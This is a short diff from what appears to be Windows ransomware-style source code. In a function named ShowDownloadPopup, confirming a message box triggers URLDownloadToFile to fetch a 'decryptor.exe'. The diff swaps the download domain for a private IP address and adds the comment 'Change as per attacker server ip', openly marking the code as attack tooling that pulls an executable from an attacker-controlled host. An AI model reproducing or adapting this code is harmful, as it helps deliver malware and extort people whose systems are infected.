@@ -238,7 +238,7 @@ void ShowDownloadPopup() {
 	if (msgboxID == IDOK) {
 		HRESULT hr = URLDownloadToFile(
 			NULL,
-			L"http://www.curvelock.site/decryptor.exe",
+			L"http://192.168.206.8/Decryptor.exe", // Change as per attacker server ip
 			L"decryptor.exe",
 			0,
 			NULL
